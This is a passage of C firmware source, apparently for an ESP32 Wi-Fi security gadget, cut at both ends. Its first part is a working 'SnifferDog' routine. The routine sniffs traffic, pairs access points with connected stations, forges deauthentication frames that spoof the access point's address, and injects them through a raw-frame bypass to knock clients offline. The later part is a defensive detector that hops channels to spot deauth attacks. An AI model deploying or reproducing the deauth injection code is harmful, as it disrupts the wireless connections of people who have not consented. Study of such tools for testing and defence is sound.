Smethan/projectZero/ESP32C5/main/main.c
    uint8_t *ap_mac = NULL;
    uint8_t *sta_mac = NULL;
    
    // Identify AP and STA based on frame type and DS bits
    if (type == WIFI_PKT_DATA) {
        // For DATA frames, use DS bits to determine direction
        if (to_ds && !from_ds) {
            // STA -> AP
            sta_mac = addr2;  // Source is STA
            ap_mac = addr1;   // Destination is AP (BSSID)
        } else if (!to_ds && from_ds) {
            // AP -> STA
            ap_mac = addr2;   // Source is AP (BSSID)
            sta_mac = addr1;  // Destination is STA
        } else if (to_ds && from_ds) {
            // WDS (Wireless Distribution System) - skip
            return;
        } else {
            // Ad-hoc or other - skip
            return;
        }
    } else if (type == WIFI_PKT_MGMT) {
        // For MGMT frames, analyze frame type
        switch (frame_type) {
            case 0x00: // Association Request
            case 0x20: // Reassociation Request
            case 0xB0: // Authentication
                sta_mac = addr2; // Source is STA
                ap_mac = addr1;  // Destination is AP
                break;
                
            case 0x10: // Association Response
            case 0x30: // Reassociation Response
                ap_mac = addr2;  // Source is AP
                sta_mac = addr1; // Destination is STA
                break;
                
            case 0x80: // Beacon
            case 0x40: // Probe Request
            case 0x50: // Probe Response
                // Skip - not AP-STA pairs
                return;
                
            default:
                // Unknown or not relevant
                return;
        }
    }
    
    // Validate AP and STA addresses
    if (!ap_mac || !sta_mac) {
        return;
    }
    
    // Skip broadcast/multicast addresses
    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
        return;
    }
    
    // Check if AP BSSID is whitelisted - skip if it is
    if (is_bssid_whitelisted(ap_mac)) {
        return; // Silently skip whitelisted networks
    }
    
    // We have a valid AP-STA pair! Send 5 deauth packets
    // Create deauth frame from AP to STA (not broadcast!)
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    // Set destination to specific STA (not broadcast!)
    memcpy(&deauth_frame[4], sta_mac, 6);
    // Set source to AP
    memcpy(&deauth_frame[10], ap_mac, 6);
    // Set BSSID to AP
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    // Send deauth frame for more effective disconnection

    // Blue LED flash to indicate deauth sent
    (void)led_set_color(0, 0, 255); // Blue

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    deauth_sent_count++;
    
    // Update shared OLED state for task to render
    snprintf((char *)sd_oled_ap, sizeof(sd_oled_ap), "%02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    snprintf((char *)sd_oled_sta, sizeof(sd_oled_sta), "%02X:%02X:%02X:%02X:%02X:%02X",
             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
    sd_oled_ch = sniffer_dog_current_channel;
    sd_oled_rssi = pkt->rx_ctrl.rssi;
    sd_oled_count = deauth_sent_count;
    sd_oled_dirty = true;
    
    (void)led_set_color(255, 0, 0); // Back to red
    
    // Log statistics for this AP-STA pair
    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
               deauth_sent_count,
               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
               sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
               sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
}

// === DEAUTH DETECTOR FUNCTIONS ===

// Helper function to find SSID by BSSID from scan results
static const char* deauth_detector_find_ssid_by_bssid(const uint8_t *bssid) {
    for (int i = 0; i < g_scan_count; i++) {
        if (memcmp(g_scan_results[i].bssid, bssid, 6) == 0) {
            return (const char*)g_scan_results[i].ssid;
        }
    }
    return NULL; // Unknown AP
}

static void deauth_detector_channel_hop(void) {
    if (!deauth_detector_active) {
        return;
    }
    
    // Check if we're in selected channels mode
    if (deauth_detector_selected_mode && deauth_detector_selected_channels_count > 0) {
        // Use selected channels only
        deauth_detector_current_channel = deauth_detector_selected_channels[deauth_detector_channel_index];
        
        deauth_detector_channel_index++;
        if (deauth_detector_channel_index >= deauth_detector_selected_channels_count) {
            deauth_detector_channel_index = 0;
        }
    } else {
        // Use dual-band channel hopping (all channels)
        deauth_detector_current_channel = dual_band_channels[deauth_detector_channel_index];
        
        deauth_detector_channel_index++;
        if (deauth_detector_channel_index >= dual_band_channels_count) {
            deauth_detector_channel_index = 0;
        }
    }
    
    esp_wifi_set_channel(deauth_detector_current_channel, WIFI_SECOND_CHAN_NONE);
    deauth_detector_last_channel_hop = esp_timer_get_time() / 1000;
}

// Task that handles channel hopping for deauth_detector
static void deauth_detector_task(void *pvParameters) {
    (void)pvParameters;
    
    log_memory_info("deauth_detector_task");
    int64_t dd_oled_last_us = 0;
    
    while (deauth_detector_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!deauth_detector_active) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - deauth_detector_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            deauth_detector_channel_hop();
            // Reset LED to yellow after channel hop (in case it was red from deauth detection)
            (void)led_set_color(255, 255, 0);
        }
        
        // OLED update (~500ms)
        int64_t now_us = esp_timer_get_time();
        if (now_us - dd_oled_last_us > 500000) {
            dd_oled_last_us = now_us;
            if (dd_oled_dirty) {
                dd_oled_dirty = false;
                char l2[64], l3[64], l4[64];
                snprintf(l2, sizeof(l2), ">> %s", (const char *)dd_oled_ssid);
                snprintf(l3, sizeof(l3), "  %s", (const char *)dd_oled_bssid);
                snprintf(l4, sizeof(l4), "Ch%d %ddB #%lu", dd_oled_ch, dd_oled_rssi, (unsigned long)dd_oled_count);
                oled_display_update_full("> Deauth Detect", l2, l3, l4);
            } else {
                char l3[64];
                snprintf(l3, sizeof(l3), "  Ch %d scanning", deauth_detector_current_channel);
                oled_display_update_full("> Deauth Detect", "  Monitoring...", l3, "  No attacks yet");
            }
        }
    }
    
    MY_LOG_INFO(TAG, "Deauth detector channel task ending");
    deauth_detector_task_handle = NULL;
    vTaskDelete(NULL);
}

// Promiscuous callback for deauth_detector - detects deauthentication frames
static void deauth_detector_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!deauth_detector_active) {
        return;
    }
    
    // Filter only MGMT packets (deauth is a management frame)
    if (type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) { // Minimum 802.11 header size
        return;
    }
    
